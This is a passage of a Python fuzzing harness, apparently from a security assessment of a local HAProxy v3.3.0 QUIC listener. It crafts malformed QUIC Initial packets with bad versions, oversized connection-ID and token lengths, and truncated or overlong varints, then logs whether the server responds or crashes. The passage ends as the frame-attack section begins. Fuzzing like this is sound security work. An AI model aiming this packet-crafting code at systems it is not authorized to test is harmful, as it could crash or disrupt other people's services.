#!/usr/bin/env python3
"""
Phase 4: QUIC Protocol-Level Attack Script
Target: HAProxy v3.3.0 on 127.0.0.1:4443 (QUIC-only) and 127.0.0.1:8443 (QUIC+HTTPS)

Tests QUIC Initial packet fuzzing, varint overflow/underflow, frame-level attacks,
transport parameter fuzzing, and CVE regression tests for CVE-2026-26081 and
CVE-2026-26080.

QUIC Initial Packet Long Header Format (RFC 9000 Section 17.2.2):
  Byte 0:   1100_00pp  (form=1, fixed=1, type=00 for Initial, pp=pkt_num_len-1)
  Bytes 1-4:  Version (0x00000001 for QUIC v1)
  Byte 5:     DCID Length (0-20)
  Bytes 6...: DCID
  Next byte:  SCID Length (0-20)
  Next bytes: SCID
  Next varint: Token Length (Initial packets only)
  Next bytes:  Token
  Next varint: Length (of packet number + payload)
  Next 1-4 bytes: Packet Number
  Remaining: Payload (encrypted)

QUIC Varint Encoding (RFC 9000 Section 16):
  2-bit length prefix in MSB of first byte:
    00 = 1 byte  (6-bit value, max 63)
    01 = 2 bytes (14-bit value, max 16383)
    10 = 4 bytes (30-bit value, max 1073741823)
    11 = 8 bytes (62-bit value, max 4611686018427387903)
"""

import socket
import struct
import time
import json
import os
import sys
import traceback
import hashlib

# ============================================================
# Configuration
# ============================================================

HOST = "127.0.0.1"
QUIC_PORT = 4443       # QUIC-only frontend
QUIC_HTTPS_PORT = 8443 # QUIC+HTTPS frontend
TARGETS = [
    (HOST, QUIC_PORT, "QUIC-only (4443)"),
    (HOST, QUIC_HTTPS_PORT, "QUIC+HTTPS (8443)"),
]

EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase4_quic_attacks.json")

# QUIC Constants
QUIC_VERSION_1        = 0x00000001
QUIC_VERSION_2        = 0x6B3343CF  # RFC 9369
QUIC_VERSION_GREASE   = 0x0A0A0A0A  # Greased version
QUIC_VERSION_ZERO     = 0x00000000  # Version Negotiation trigger

# Packet type bits (long header, bits 4-5 of byte 0)
QUIC_PKT_TYPE_INITIAL   = 0x00
QUIC_PKT_TYPE_0RTT      = 0x01
QUIC_PKT_TYPE_HANDSHAKE = 0x02
QUIC_PKT_TYPE_RETRY     = 0x03

# Frame type constants
QUIC_FT_PADDING             = 0x00
QUIC_FT_PING                = 0x01
QUIC_FT_ACK                 = 0x02
QUIC_FT_ACK_ECN             = 0x03
QUIC_FT_RESET_STREAM        = 0x04
QUIC_FT_STOP_SENDING        = 0x05
QUIC_FT_CRYPTO              = 0x06
QUIC_FT_NEW_TOKEN           = 0x07
QUIC_FT_STREAM_8            = 0x08
QUIC_FT_MAX_DATA            = 0x10
QUIC_FT_CONNECTION_CLOSE    = 0x1c
QUIC_FT_HANDSHAKE_DONE      = 0x1e

# CID constraints from HAProxy source
QUIC_CID_MAXLEN = 20
QUIC_HAP_CID_LEN = 8
QUIC_INITIAL_PACKET_MINLEN = 1200

# QUIC Varint boundaries
QUIC_VARINT_1_BYTE_MAX = (1 << 6) - 1       # 63
QUIC_VARINT_2_BYTE_MAX = (1 << 14) - 1      # 16383
QUIC_VARINT_4_BYTE_MAX = (1 << 30) - 1      # 1073741823
QUIC_VARINT_8_BYTE_MAX = (1 << 62) - 1      # 4611686018427387903

# ============================================================
# Evidence Collector
# ============================================================

class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None, raw_data=None):
        self.test_count += 1
        entry = {
            "id": self.test_count,
            "category": category,
            "name": name,
            "result": result,
            "details": details,
            "timestamp": time.time()
        }
        if severity:
            entry["severity"] = severity
        if raw_data:
            entry["raw_data"] = raw_data
        self.tests.append(entry)
        if result == "ANOMALY":
            self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)
        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in str(details).split("\n")[:5]:
                print(f"               {line}")

    def save(self):
        data = {
            "phase": "Phase 4: QUIC Protocol-Level Attacks",
            "target": f"HAProxy v3.3.0 @ {HOST}:{QUIC_PORT} (QUIC-only), {HOST}:{QUIC_HTTPS_PORT} (QUIC+HTTPS)",
            "timestamp": time.time(),
            "summary": {
                "total_tests": self.test_count,
                "anomalies": self.anomaly_count,
                "findings": self.finding_count
            },
            "findings": self.findings,
            "tests": self.tests
        }
        os.makedirs(EVIDENCE_DIR, exist_ok=True)
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")


evidence = EvidenceCollector()

# ============================================================
# QUIC Varint Encoding/Decoding Helpers
# ============================================================

def quic_encode_varint(value):
    """Encode a QUIC variable-length integer (RFC 9000 Section 16)."""
    if value <= QUIC_VARINT_1_BYTE_MAX:
        return struct.pack(">B", value)  # 00xxxxxx
    elif value <= QUIC_VARINT_2_BYTE_MAX:
        return struct.pack(">H", 0x4000 | value)  # 01xxxxxx xxxxxxxx
    elif value <= QUIC_VARINT_4_BYTE_MAX:
        return struct.pack(">I", 0x80000000 | value)  # 10xxxxxx ...
    elif value <= QUIC_VARINT_8_BYTE_MAX:
        return struct.pack(">Q", 0xC000000000000000 | value)  # 11xxxxxx ...
    else:
        raise ValueError(f"Value {value} exceeds QUIC varint max (2^62-1)")


def quic_encode_varint_forced(value, width):
    """Encode a QUIC varint forcing a specific width (overlong encoding)."""
    if width == 1:
        return struct.pack(">B", value & 0x3F)
    elif width == 2:
        return struct.pack(">H", 0x4000 | (value & 0x3FFF))
    elif width == 4:
        return struct.pack(">I", 0x80000000 | (value & 0x3FFFFFFF))
    elif width == 8:
        return struct.pack(">Q", 0xC000000000000000 | (value & 0x3FFFFFFFFFFFFFFF))
    else:
        raise ValueError(f"Invalid varint width: {width}")


def quic_encode_varint_raw(raw_bytes):
    """Return raw bytes as-is for crafted varint injection."""
    return bytes(raw_bytes)


# ============================================================
# QUIC Packet Building Helpers
# ============================================================

def build_quic_initial_packet(dcid, scid, token, payload,
                               version=QUIC_VERSION_1,
                               pkt_num=0, pkt_num_len=1,
                               token_len_override=None,
                               length_override=None,
                               raw_token_len_bytes=None,
                               flags_override=None,
                               pad_to_1200=True):
    """
    Build a QUIC Initial packet (long header).

    Args:
        dcid: Destination Connection ID bytes
        scid: Source Connection ID bytes
        token: Token bytes (can be empty)
        payload: Payload bytes (after packet number)
        version: QUIC version (4 bytes, default v1)
        pkt_num: Packet number value
        pkt_num_len: Packet number length (1-4 bytes)
        token_len_override: Override the token length varint encoding
        length_override: Override the length varint encoding
        raw_token_len_bytes: Raw bytes for token length field (bypasses varint encoding)
        flags_override: Override the first byte (flags)
        pad_to_1200: Whether to pad the datagram to 1200 bytes minimum
    """
    # Byte 0: 1100_00pp (form=1, fixed=1, type=Initial=00, pp=pkt_num_len-1)
    if flags_override is not None:
        byte0 = flags_override
    else:
        byte0 = 0xC0 | ((pkt_num_len - 1) & 0x03)

    packet = struct.pack(">B", byte0)

    # Version (4 bytes)
    packet += struct.pack(">I", version)

    # DCID Length + DCID
    packet += struct.pack(">B", len(dcid))
    packet += dcid

    # SCID Length + SCID
    packet += struct.pack(">B", len(scid))
    packet += scid

    # Token Length + Token
    if raw_token_len_bytes is not None:
        packet += bytes(raw_token_len_bytes)
    elif token_len_override is not None:
        packet += token_len_override
    else:
        packet += quic_encode_varint(len(token))
    packet += token

    # Packet Number encoding
    if pkt_num_len == 1:
        pn_bytes = struct.pack(">B", pkt_num & 0xFF)
    elif pkt_num_len == 2:
        pn_bytes = struct.pack(">H", pkt_num & 0xFFFF)
    elif pkt_num_len == 3:
        pn_bytes = struct.pack(">I", pkt_num & 0xFFFFFF)[1:]
    else:
        pn_bytes = struct.pack(">I", pkt_num & 0xFFFFFFFF)

    # Length field covers packet number + payload
    inner = pn_bytes + payload
    if length_override is not None:
        packet += length_override
    else:
        packet += quic_encode_varint(len(inner))
    packet += inner

    # Pad to minimum datagram size for Initial packets
    if pad_to_1200 and len(packet) < QUIC_INITIAL_PACKET_MINLEN:
        packet += b"\x00" * (QUIC_INITIAL_PACKET_MINLEN - len(packet))

    return packet


def build_version_negotiation_packet(dcid, scid, versions):
    """Build a Version Negotiation packet (version=0, no fixed bit requirement)."""
    byte0 = 0x80 | (os.urandom(1)[0] & 0x7F)  # Long header, random bits
    packet = struct.pack(">B", byte0)
    packet += struct.pack(">I", 0x00000000)  # Version = 0
    packet += struct.pack(">B", len(dcid))
    packet += dcid
    packet += struct.pack(">B", len(scid))
    packet += scid
    for v in versions:
        packet += struct.pack(">I", v)
    return packet


# ============================================================
# UDP Send/Receive Helpers
# ============================================================

def send_udp(data, host=HOST, port=QUIC_PORT, timeout=2.0):
    """Send UDP datagram and wait for response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(data, (host, port))
        try:
            resp, addr = sock.recvfrom(65535)
            return resp
        except socket.timeout:
            return None
    finally:
        sock.close()


def send_udp_no_wait(data, host=HOST, port=QUIC_PORT):
    """Send UDP datagram without waiting for response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(data, (host, port))
    finally:
        sock.close()


def check_haproxy_alive(host=HOST, port=QUIC_PORT, timeout=2.0):
    """Check if HAProxy QUIC listener is still responding."""
    # Send a well-formed Initial packet and check for any response
    dcid = os.urandom(8)
    scid = os.urandom(8)
    payload = b"\x06" + quic_encode_varint(0) + quic_encode_varint(0)  # CRYPTO frame, offset=0, len=0
    pkt = build_quic_initial_packet(dcid, scid, b"", payload)
    resp = send_udp(pkt, host, port, timeout)
    return resp is not None


def classify_response(resp, test_label):
    """Classify the UDP response from HAProxy."""
    if resp is None:
        return "NO_RESPONSE", "No UDP response (silent drop or crash)"

    if len(resp) < 5:
        return "SHORT_RESPONSE", f"Very short response: {len(resp)} bytes, hex={resp.hex()}"

    # Check first byte for long/short header
    byte0 = resp[0]
    if byte0 & 0x80:  # Long header
        # Check version field
        if len(resp) >= 5:
            version = struct.unpack(">I", resp[1:5])[0]
            if version == 0:
                # Version Negotiation
                return "VERSION_NEGOTIATION", f"Version Negotiation packet, {len(resp)} bytes"
            elif version == QUIC_VERSION_1:
                pkt_type = (byte0 >> 4) & 0x03
                type_names = {0: "Initial", 1: "0-RTT", 2: "Handshake", 3: "Retry"}
                return f"QUIC_{type_names.get(pkt_type, 'UNKNOWN')}", \
                       f"QUIC {type_names.get(pkt_type, f'type={pkt_type}')} response, {len(resp)} bytes"
        return "LONG_HEADER", f"Long header response, {len(resp)} bytes"
    else:
        return "SHORT_HEADER", f"Short header response, {len(resp)} bytes"


# ============================================================
# Category 1: QUIC Initial Packet Fuzzing
# ============================================================

def test_initial_packet_fuzzing():
    """Test malformed QUIC Initial packets."""
    print("\n" + "=" * 70)
    print("[*] Category 1: QUIC Initial Packet Fuzzing")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")

        # 1.1: Baseline - well-formed Initial packet
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)
        # CRYPTO frame: type=0x06, offset=0, length=0
        crypto_frame = b"\x06" + quic_encode_varint(0) + quic_encode_varint(0)
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "baseline")
        evidence.add_test("Initial-Fuzz", f"baseline_{port}",
                         "SAFE" if resp is not None else "ANOMALY",
                         f"Baseline Initial: {resp_type} - {resp_detail}")

        # 1.2: Malformed Version Negotiation trigger (version=0)
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         version=QUIC_VERSION_ZERO, pad_to_1200=True)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "version_zero")
        # HAProxy should send Version Negotiation or drop
        evidence.add_test("Initial-Fuzz", f"version_zero_{port}",
                         "SAFE",
                         f"Version=0 trigger: {resp_type} - {resp_detail}")

        # 1.3: Unsupported version (should trigger Version Negotiation)
        for vname, version in [("GREASE", QUIC_VERSION_GREASE),
                                ("0xDEADBEEF", 0xDEADBEEF),
                                ("0xFFFFFFFF", 0xFFFFFFFF),
                                ("0x00000002", 0x00000002)]:
            pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                             version=version, pad_to_1200=True)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"version_{vname}")
            evidence.add_test("Initial-Fuzz", f"version_{vname}_{port}",
                             "SAFE" if resp_type == "VERSION_NEGOTIATION" else "ANOMALY",
                             f"Version={vname}: {resp_type} - {resp_detail}")

        # 1.4: Token length manipulation
        print(f"\n  [*] Token length edge cases ({port_label})")

        # 1.4a: Zero token (normal)
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         token_len_override=quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "token_len_zero")
        evidence.add_test("Initial-Fuzz", f"token_len_zero_{port}", "SAFE",
                         f"Token length=0: {resp_type} - {resp_detail}")

        # 1.4b: Large token length with no actual token data
        # This should cause end-pos < token_len check to fail
        for tok_len_val in [100, 1000, 0x3FFF, 0x3FFFFFFF]:
            tok_len_name = f"0x{tok_len_val:X}"
            pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                             token_len_override=quic_encode_varint(tok_len_val))
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"token_huge_{tok_len_name}")
            expected_safe = resp is None or resp_type == "NO_RESPONSE"
            evidence.add_test("Initial-Fuzz", f"token_len_huge_{tok_len_name}_{port}",
                             "SAFE" if expected_safe else "ANOMALY",
                             f"Token length={tok_len_name}, no token data: {resp_type} - {resp_detail}",
                             "HIGH" if not expected_safe else None)

        # 1.4c: Token length as 8-byte overlong varint encoding of 0
        # Raw: 0xC0 0x00 0x00 0x00 0x00 0x00 0x00 0x00 = value 0 in 8 bytes
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         raw_token_len_bytes=[0xC0, 0x00, 0x00, 0x00,
                                                              0x00, 0x00, 0x00, 0x00])
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "token_overlong_zero")
        evidence.add_test("Initial-Fuzz", f"token_overlong_zero_8byte_{port}",
                         "ANOMALY" if resp is not None else "SAFE",
                         f"Overlong varint(0) for token length: {resp_type} - {resp_detail}",
                         "MEDIUM" if resp is not None else None)

        # 1.4d: Token length = max varint (2^62 - 1)
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         token_len_override=quic_encode_varint(QUIC_VARINT_8_BYTE_MAX))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "token_max_varint")
        evidence.add_test("Initial-Fuzz", f"token_len_max_varint_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Token length=2^62-1: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 1.5: Connection ID length edge cases
        print(f"\n  [*] Connection ID length edge cases ({port_label})")

        # 1.5a: DCID length = 0
        pkt = build_quic_initial_packet(b"", scid, b"", crypto_frame)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "dcid_len_0")
        evidence.add_test("Initial-Fuzz", f"dcid_len_0_{port}",
                         "SAFE",
                         f"DCID length=0: {resp_type} - {resp_detail}")

        # 1.5b: DCID length = max (20 per RFC 9000)
        pkt = build_quic_initial_packet(os.urandom(20), scid, b"", crypto_frame)
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "dcid_len_20")
        evidence.add_test("Initial-Fuzz", f"dcid_len_max20_{port}",
                         "SAFE",
                         f"DCID length=20 (max): {resp_type} - {resp_detail}")

        # 1.5c: DCID length = 21 (overflow, > QUIC_CID_MAXLEN)
        # We must craft this raw since build_quic_initial_packet uses len(dcid)
        raw_pkt = struct.pack(">B", 0xC0)  # Initial, pn_len=1
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", 21)  # DCID length = 21 (exceeds max)
        raw_pkt += os.urandom(21)
        raw_pkt += struct.pack(">B", len(scid))
        raw_pkt += scid
        raw_pkt += quic_encode_varint(0)  # token length
        raw_pkt += quic_encode_varint(2)  # length
        raw_pkt += b"\x00\x00"  # pkt_num + padding
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "dcid_len_21")
        evidence.add_test("Initial-Fuzz", f"dcid_len_21_overflow_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"DCID length=21 (>max): {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 1.5d: DCID length = 255 (full byte overflow)
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", 255)  # DCID length = 255
        raw_pkt += os.urandom(255)
        raw_pkt += struct.pack(">B", 0)  # SCID length = 0
        raw_pkt += quic_encode_varint(0)
        raw_pkt += quic_encode_varint(1)
        raw_pkt += b"\x00"
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "dcid_len_255")
        evidence.add_test("Initial-Fuzz", f"dcid_len_255_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"DCID length=255: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 1.5e: SCID length = 0 + max
        for scid_test_len in [0, 20, 21, 255]:
            scid_data = os.urandom(min(scid_test_len, 255))
            raw_pkt = struct.pack(">B", 0xC0)
            raw_pkt += struct.pack(">I", QUIC_VERSION_1)
            raw_pkt += struct.pack(">B", len(dcid))
            raw_pkt += dcid
            raw_pkt += struct.pack(">B", scid_test_len)
            raw_pkt += scid_data
            raw_pkt += quic_encode_varint(0)
            raw_pkt += quic_encode_varint(1)
            raw_pkt += b"\x00"
            raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
            resp = send_udp(raw_pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"scid_len_{scid_test_len}")
            is_overflow = scid_test_len > QUIC_CID_MAXLEN
            evidence.add_test("Initial-Fuzz", f"scid_len_{scid_test_len}_{port}",
                             "SAFE" if (is_overflow and resp is None) or not is_overflow else "ANOMALY",
                             f"SCID length={scid_test_len}: {resp_type} - {resp_detail}",
                             "HIGH" if is_overflow and resp is not None else None)

        # 1.6: Fixed bit not set (should be rejected per RFC 9000)
        print(f"\n  [*] Fixed bit and header manipulation ({port_label})")
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         flags_override=0x80)  # form=1, fixed=0
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "no_fixed_bit")
        evidence.add_test("Initial-Fuzz", f"fixed_bit_clear_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Fixed bit=0 (0x80): {resp_type} - {resp_detail}",
                         "MEDIUM" if resp is not None else None)

        # 1.7: Wrong packet type in Initial position (Handshake type bits)
        pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                         flags_override=0xE0)  # form=1, fixed=1, type=Handshake
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "wrong_pkt_type")
        evidence.add_test("Initial-Fuzz", f"wrong_pkt_type_handshake_{port}",
                         "SAFE",
                         f"Handshake type in Initial position: {resp_type} - {resp_detail}")

        # 1.8: Packet number length edge cases (pp bits)
        for pnl in [1, 2, 3, 4]:
            pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                             pkt_num_len=pnl)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"pnl_{pnl}")
            evidence.add_test("Initial-Fuzz", f"pkt_num_len_{pnl}_{port}",
                             "SAFE",
                             f"Packet number length={pnl}: {resp_type} - {resp_detail}")

        # 1.9: Datagram shorter than 1200 bytes
        short_pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame, pad_to_1200=False)
        resp = send_udp(short_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "short_datagram")
        evidence.add_test("Initial-Fuzz", f"short_datagram_{len(short_pkt)}B_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Short datagram ({len(short_pkt)} bytes, <1200): {resp_type} - {resp_detail}",
                         "MEDIUM" if resp is not None else None)

        # 1.10: Zero-length datagram
        resp = send_udp(b"", host, port)
        evidence.add_test("Initial-Fuzz", f"empty_datagram_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Empty datagram: {classify_response(resp, 'empty')[1]}")

        # 1.11: Single-byte datagram
        resp = send_udp(b"\xC0", host, port)
        evidence.add_test("Initial-Fuzz", f"single_byte_datagram_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Single byte (0xC0): {classify_response(resp, 'single')[1]}")

        # 1.12: All-zeros datagram (1200 bytes)
        resp = send_udp(b"\x00" * 1200, host, port)
        evidence.add_test("Initial-Fuzz", f"all_zeros_1200B_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"All-zeros 1200B: {classify_response(resp, 'zeros')[1]}")

        # Crash check after Initial fuzzing
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Initial-Fuzz", f"crash_check_post_initial_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after Initial fuzzing: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 2: QUIC Varint Overflow
# ============================================================

def test_quic_varint_overflow():
    """Test QUIC variable-length integer encoding attacks."""
    print("\n" + "=" * 70)
    print("[*] Category 2: QUIC Varint Overflow/Underflow")
    print("=" * 70)

    for host, port, port_label in TARGETS:
        print(f"\n  --- Target: {port_label} ---")
        dcid = os.urandom(QUIC_HAP_CID_LEN)
        scid = os.urandom(QUIC_HAP_CID_LEN)

        # 2.1: Overlong varint encoding for token length
        # RFC 9000 does not forbid overlong encoding, but implementations may reject it
        print(f"\n  [*] Overlong varint encoding tests ({port_label})")
        overlong_tests = [
            ("0_in_2B", quic_encode_varint_forced(0, 2), 0),
            ("0_in_4B", quic_encode_varint_forced(0, 4), 0),
            ("0_in_8B", quic_encode_varint_forced(0, 8), 0),
            ("1_in_2B", quic_encode_varint_forced(1, 2), 1),
            ("1_in_4B", quic_encode_varint_forced(1, 4), 1),
            ("1_in_8B", quic_encode_varint_forced(1, 8), 1),
            ("63_in_2B", quic_encode_varint_forced(63, 2), 63),
            ("63_in_4B", quic_encode_varint_forced(63, 4), 63),
            ("63_in_8B", quic_encode_varint_forced(63, 8), 63),
        ]
        for label, varint_bytes, decoded_val in overlong_tests:
            crypto_frame = b"\x06" + quic_encode_varint(0) + quic_encode_varint(0)
            pkt = build_quic_initial_packet(dcid, scid, b"", crypto_frame,
                                             token_len_override=varint_bytes)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"overlong_{label}")
            evidence.add_test("Varint-Overflow", f"overlong_token_len_{label}_{port}",
                             "SAFE" if resp is not None or decoded_val == 0 else "ANOMALY",
                             f"Overlong varint({label}): {resp_type} - {resp_detail}\n"
                             f"Varint hex: {varint_bytes.hex()}")

        # 2.2: Maximum varint values in packet fields
        print(f"\n  [*] Maximum varint value tests ({port_label})")

        # 2.2a: Length field = 2^62-1
        pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00",
                                         length_override=quic_encode_varint(QUIC_VARINT_8_BYTE_MAX))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "length_max")
        evidence.add_test("Varint-Overflow", f"length_field_max_varint_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Length=2^62-1: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 2.2b: Length field = 0
        pkt = build_quic_initial_packet(dcid, scid, b"", b"",
                                         length_override=quic_encode_varint(0))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "length_zero")
        evidence.add_test("Varint-Overflow", f"length_field_zero_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Length=0: {resp_type} - {resp_detail}")

        # 2.2c: Length mismatch - claims more data than available
        pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00" * 10,
                                         length_override=quic_encode_varint(5000))
        resp = send_udp(pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "length_mismatch")
        evidence.add_test("Varint-Overflow", f"length_mismatch_large_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Length=5000, actual=10: {resp_type} - {resp_detail}")

        # 2.3: Truncated varints (CVE-2026-26080 regression area)
        print(f"\n  [*] Truncated varint tests ({port_label})")

        # 2.3a: 2-byte varint with only 1 byte present
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        # Token length: start of 2-byte varint (0x40) but truncated - only 1 byte
        raw_pkt += bytes([0x40])
        # The packet ends here, so the varint is truncated
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "truncated_2B_varint")
        evidence.add_test("Varint-Overflow", f"truncated_varint_2B_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Truncated 2-byte varint (token_len): {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 2.3b: 4-byte varint with only 2 bytes present
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        raw_pkt += bytes([0x80, 0x00])  # 4-byte varint prefix, only 2 bytes present
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "truncated_4B_varint")
        evidence.add_test("Varint-Overflow", f"truncated_varint_4B_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Truncated 4-byte varint: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 2.3c: 8-byte varint with only 4 bytes present
        raw_pkt = struct.pack(">B", 0xC0)
        raw_pkt += struct.pack(">I", QUIC_VERSION_1)
        raw_pkt += struct.pack(">B", len(dcid)) + dcid
        raw_pkt += struct.pack(">B", len(scid)) + scid
        raw_pkt += bytes([0xC0, 0x00, 0x00, 0x00])  # 8-byte varint, only 4 bytes
        raw_pkt += b"\x00" * max(0, QUIC_INITIAL_PACKET_MINLEN - len(raw_pkt))
        resp = send_udp(raw_pkt, host, port)
        resp_type, resp_detail = classify_response(resp, "truncated_8B_varint")
        evidence.add_test("Varint-Overflow", f"truncated_varint_8B_{port}",
                         "SAFE" if resp is None else "ANOMALY",
                         f"Truncated 8-byte varint: {resp_type} - {resp_detail}",
                         "HIGH" if resp is not None else None)

        # 2.4: Varint boundary values
        print(f"\n  [*] Varint boundary values ({port_label})")
        boundary_values = [
            ("1B_max", 63),
            ("2B_min", 64),
            ("2B_max", 16383),
            ("4B_min", 16384),
            ("4B_max", QUIC_VARINT_4_BYTE_MAX),
            ("8B_min", QUIC_VARINT_4_BYTE_MAX + 1),
        ]
        for bname, bval in boundary_values:
            # Use as token length with no actual token data
            pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00",
                                             token_len_override=quic_encode_varint(bval))
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"boundary_{bname}")
            evidence.add_test("Varint-Overflow", f"boundary_{bname}_{port}",
                             "SAFE" if resp is None else "ANOMALY",
                             f"Token length={bname} ({bval}): {resp_type} - {resp_detail}")

        # 2.5: Varint with all bits set in data portion
        print(f"\n  [*] All-bits-set varint tests ({port_label})")
        for width_label, raw_bytes in [
            ("1B_0x3F", [0x3F]),           # 1-byte, value=63
            ("2B_0x7FFF", [0x7F, 0xFF]),   # 2-byte, value=16383
            ("4B_0xBFFFFFFF", [0xBF, 0xFF, 0xFF, 0xFF]),  # 4-byte, max
            ("8B_max", [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),  # 8-byte, max
        ]:
            pkt = build_quic_initial_packet(dcid, scid, b"", b"\x00",
                                             raw_token_len_bytes=raw_bytes)
            resp = send_udp(pkt, host, port)
            resp_type, resp_detail = classify_response(resp, f"allbits_{width_label}")
            evidence.add_test("Varint-Overflow", f"allbits_{width_label}_{port}",
                             "SAFE" if resp is None else "ANOMALY",
                             f"Token len all-bits-set {width_label}: {resp_type} - {resp_detail}",
                             "MEDIUM" if resp is not None else None)

        # Crash check
        alive = check_haproxy_alive(host, port)
        evidence.add_test("Varint-Overflow", f"crash_check_post_varint_{port}",
                         "SAFE" if alive else "FINDING",
                         f"HAProxy alive after varint tests: {alive}",
                         "CRITICAL" if not alive else None)


# ============================================================
# Category 3: QUIC Frame Attacks
# ============================================================

def build_frame_in_initial(frame_payload, host=HOST, port=QUIC_PORT):
    """
    Build and send an Initial packet containing a crafted frame payload.
